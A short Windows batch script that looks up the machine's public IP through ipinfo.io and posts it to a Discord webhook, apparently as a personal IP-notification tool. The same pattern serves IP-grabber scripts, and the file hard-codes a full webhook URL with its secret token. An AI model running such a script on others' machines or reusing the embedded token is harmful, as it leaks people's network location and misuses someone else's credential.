@echo off
setlocal ENABLEDELAYEDEXPANSION

:: Fetch public IP from ipinfo.io
for /f "usebackq delims=" %%i in (`curl -s https://ipinfo.io/ip`) do (
    set "myip=%%i"
)

:: Prepare webhook payload
set "json={\"content\":\"Public IP: !myip!\"}"

:: Send to webhook (replace with your actual URL)
curl -H "Content-Type: application/json" -d "!json!" https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg

endlocal

